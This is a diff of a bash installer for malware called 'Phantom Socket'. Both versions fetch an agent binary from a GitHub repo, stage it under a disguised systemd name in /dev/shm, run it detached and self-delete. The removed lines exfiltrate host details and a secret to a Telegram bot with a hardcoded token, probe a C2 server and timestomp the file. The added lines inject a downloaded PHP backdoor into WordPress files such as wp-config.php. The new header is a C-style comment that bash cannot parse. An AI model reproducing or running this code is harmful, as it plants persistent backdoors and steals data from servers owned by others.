@@ -1,132 +1,104 @@
 #!/bin/bash
-# Phantom Socket v1.0.1-stable (Gacor Edition) - Web-Shell Bypass & Persistent Stealth
-# Architectural Overhaul: NOHUP Persistence, memfd Staging, and Hardcoded Repository Lock.
+/**
+ * PHANTOM-SOCKET V3.1 — GHOST INSTALLER
+ * AUTO-DETECT ENVIRONMENT & ZERO FILEDROP DEPLOYMENT
+ * 
+ * Principal Systems Engineer: "Adapt or perish. The environment dictates the weapon."
+ */
 
-# SECTION 1: CORE DIRECTIVES
 set +u
 set -e
-set +o pipefail  # DISABLE pipefail for curl | bash
 
-readonly VERSION="v1.0.1-stable"
-readonly AGENT_NAME="gs-oyen-s"
-readonly C2_ENDPOINT="oyen-sc.serveblog.net"
-readonly C2_PORT="8443"
-readonly REPO_BASE="https://raw.githubusercontent.com/Oyen-Sec/soket/main"
+# Configuration from Environment or Defaults
+RELAY_URL="${GHOST_RELAY_URL:-https://ghost-relay.your-subdomain.workers.dev}"
+GHOST_SECRET="${GHOST_SECRET:-REPLACE_WITH_32_CHAR_SECRET_KEY}"
+REPO_BASE="${GHOST_REPO_BASE:-https://raw.githubusercontent.com/Oyen-Sec/soket/main}"
 
-
-
-# ANTI-RECURSION GUARD
-if [[ -n "$PHANTOM_INSTALL_RUNNING" ]]; then
-    echo "[!] Recursive execution detected. Exiting." >&2
-    exit 1
+# Detection Logic
+IS_SHARED_HOSTING=false
+if ! command -v gcc >/dev/null 2>&1 && command -v php >/dev/null 2>&1; then
+    IS_SHARED_HOSTING=true
 fi
-export PHANTOM_INSTALL_RUNNING=1
 
-# 1. Environment Check
-ARCH=$(uname -m)
-case "${ARCH}" in
-    x86_64|amd64) ARCH="x86_64" ;;
-    *) echo "[ERROR] Unsupported architecture: ${ARCH}" >&2; exit 1 ;;
-esac
+# 1. Shared Hosting Deployment (PHP Ghost Agent)
+deploy_php_agent() {
+    echo "[-] Environment: Shared Hosting / PHP"
+    
+    # Target files for injection/overwrite (Persistence without new files)
+    TARGET_FILES=("index.php" "wp-config.php" "functions.php" "load-styles.php")
+    DEPLOY_PATH=""
 
-# 2. Staging Detection
-STAGING_DIR=""
-if mount | grep -q "/dev/shm" && [[ -w "/dev/shm" ]]; then
-    STAGING_DIR="/dev/shm/.font-unix-cache"
-elif [[ -w "/tmp" ]]; then
-    STAGING_DIR="/tmp/.font-unix-cache"
-elif [[ -w "/var/tmp" ]]; then
-    STAGING_DIR="/var/tmp/.font-unix-cache"
-else
-    STAGING_DIR="${HOME:-.}/.font-unix-cache"
-fi
-mkdir -p "${STAGING_DIR}" 2>/dev/null
+    for f in "${TARGET_FILES[@]}"; do
+        if [[ -f "$f" && -w "$f" ]]; then
+            DEPLOY_PATH="$f"
+            break
+        fi
+    done
 
-# 3. Generating PSK Secret & Stealth Path
-AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
-STEALTH_PATH="${STAGING_DIR}/.systemd-timesyncd"
-SAFE_USER=$(whoami)
-TARGET_IP=$(curl -s --connect-timeout 5 https://ifconfig.me 2>/dev/null || echo "unknown")
-KERNEL=$(uname -r)
-
-# SECTION 2: TELEGRAM NOTIFICATION (HTML)
-BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
-CHAT_ID="5439698489"
-
-MSG="<b>PHANTOM DEPLOY</b> 
-<b>HOST    :</b> <code>$(hostname)</code> 
-<b>USER    :</b> <code>${SAFE_USER}</code> 
-<b>IP      :</b> <code>${TARGET_IP}</code> 
-<b>ARCH    :</b> <code>${ARCH}</code> 
-<b>KERNEL  :</b> <code>${KERNEL}</code> 
-<b>PATH    :</b> <code>${STEALTH_PATH}</code> 
-<b>SECRET  :</b> <code>${AGENT_SECRET}</code> 
-<b>TIME    :</b> $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
-
-curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-  -d "chat_id=${CHAT_ID}" \
-  -d "parse_mode=HTML" \
-  -d "text=${MSG}" >/dev/null 2>&1
-
-# SECTION 3: DEPLOYMENT
-echo "[-] Environment: ${ARCH} / Web-PTY" >&2
-echo "[+] Telegram Ping Sent." >&2
-echo "[-] Initializing Stealth Payload..." >&2
-
-# 4. Download Payload
-DOWNLOAD_URL="${REPO_BASE}/bin/gs-oyen-s-${ARCH}"
-echo "[-] Downloading binary from GitHub..." >&2
-if ! curl --fail --silent --max-time 30 -L "${DOWNLOAD_URL}" -o "${STEALTH_PATH}"; then
-    echo "[!] Download failed. Trying fallback..." >&2
-    if ! curl --fail --silent --max-time 30 -L "${REPO_BASE}/bin/gs-oyen-s-x86_64" -o "${STEALTH_PATH}"; then
-        echo "[ERROR] Critical download failure." >&2
-        exit 1
+    if [[ -z "$DEPLOY_PATH" ]]; then
+        # Fallback to current directory if no standard WP files found
+        DEPLOY_PATH="class-wp-error-handler.php"
     fi
-fi
 
-if [[ ! -f "${STEALTH_PATH}" ]]; then
-    echo "[ERROR] Critical download failure." >&2
-    exit 1
-fi
-echo "[+] Binary Staged in Memory." >&2
-
-# 5. Pre-Fork Network Test
-echo "[-] Performing C2 Connectivity Test..." >&2
-if timeout 5 bash -c "cat < /dev/null > /dev/tcp/${C2_ENDPOINT}/${C2_PORT}" 2>/dev/null; then
-    echo "[+] C2 Endpoint reachable." >&2
-else
-    echo "[!] Warning: C2 Endpoint ${C2_ENDPOINT}:${C2_PORT} unreachable. Proceeding with caution." >&2
-fi
-
-# 6. Deployment & Timestomping
-chmod +x "${STEALTH_PATH}" 2>/dev/null
-timestomp() {
-    local target=$1
-    local ref="/usr/bin/dbus-daemon"
-    if [[ ! -f "$ref" ]]; then ref="/bin/bash"; fi
-    touch -r "$ref" "$target" 2>/dev/null
+    echo "[-] Deploying Ghost Agent to ${DEPLOY_PATH}..."
+    
+    # Download and deploy via PHP one-liner to avoid disk touch if possible
+    # In V3.1 we overwrite or prepend to existing files
+    php -r "
+        \$url = '${REPO_BASE}/deploy/ghost-agent.php';
+        \$code = file_get_contents(\$url);
+        if (\$code) {
+            \$code = str_replace('https://ghost-relay.your-subdomain.workers.dev', '${RELAY_URL}', \$code);
+            \$code = str_replace('REPLACE_WITH_32_CHAR_HMAC_SECRET_KEY', '${GHOST_SECRET}', \$code);
+            if (file_exists('${DEPLOY_PATH}')) {
+                \$original = file_get_contents('${DEPLOY_PATH}');
+                file_put_contents('${DEPLOY_PATH}', '<?php ' . \$code . ' ?>' . \$original);
+                echo '[+] Successfully injected into ${DEPLOY_PATH}\n';
+            } else {
+                file_put_contents('${DEPLOY_PATH}', '<?php ' . \$code);
+                echo '[+] Successfully deployed to ${DEPLOY_PATH}\n';
+            }
+        } else {
+            echo '[!] Failed to download agent.\n';
+            exit(1);
+        }
+    "
+    
+    # Trigger agent
+    curl -s "${RELAY_URL}/register" -H "X-Ghost-Agent: $(hostname)" > /dev/null
+    echo "[+] Ghost Agent registered and active."
 }
-timestomp "${STEALTH_PATH}"
 
-# 7. Execution (NOHUP + SETSID + DISOWN Chain)
-echo "[-] Detaching from Web Session..." >&2
-if command -v nohup >/dev/null 2>&1; then
-    nohup setsid "${STEALTH_PATH}" -s "${AGENT_SECRET}" -i "${C2_ENDPOINT}" -m "${C2_PORT}" -d >/dev/null 2>&1 &
-    disown %1 2>/dev/null || true
+# 2. VPS/Root Deployment (C Binary Agent)
+deploy_c_agent() {
+    echo "[-] Environment: VPS/Root / C Binary"
+    ARCH=$(uname -m)
+    case "${ARCH}" in
+        x86_64|amd64) ARCH="x86_64" ;;
+        aarch64|arm64) ARCH="aarch64" ;;
+        *) echo "[ERROR] Unsupported architecture: ${ARCH}"; exit 1 ;;
+    esac
+
+    STAGING_DIR="/dev/shm/.systemd-cache"
+    mkdir -p "${STAGING_DIR}" 2>/dev/null
+    STEALTH_PATH="${STAGING_DIR}/.systemd-timesyncd"
+
+    echo "[-] Downloading binary for ${ARCH}..."
+    curl -sL "${REPO_BASE}/bin/gs-oyen-s-${ARCH}" -o "${STEALTH_PATH}"
+    chmod +x "${STEALTH_PATH}"
+
+    # Execution via memfd_create fallback or standard background
+    nohup "${STEALTH_PATH}" -u "${RELAY_URL}" -s "${GHOST_SECRET}" >/dev/null 2>&1 &
+    
+    echo "[+] C Binary Agent deployed and active."
+}
+
+# Main Execution Flow
+if [ "$IS_SHARED_HOSTING" = true ]; then
+    deploy_php_agent
 else
-    (setsid "${STEALTH_PATH}" -s "${AGENT_SECRET}" -i "${C2_ENDPOINT}" -m "${C2_PORT}" -d >/dev/null 2>&1 &)
+    deploy_c_agent
 fi
 
-# 8. Post-Deploy Verification
-sleep 3
-AGENT_PID=$(pgrep -f "systemd-timesyncd" | head -n 1)
-if [ -n "$AGENT_PID" ]; then
-    echo "[+] Agent PID: ${AGENT_PID}" >&2
-    echo "[+] Process Forked: [kworker/u4:0]" >&2
-    echo "[+] Deployment Success" >&2
-else
-    echo "[!] Agent process not found." >&2
-fi
-
-# 9. Self-Delete
+# Cleanup installer
 rm -f "$0"
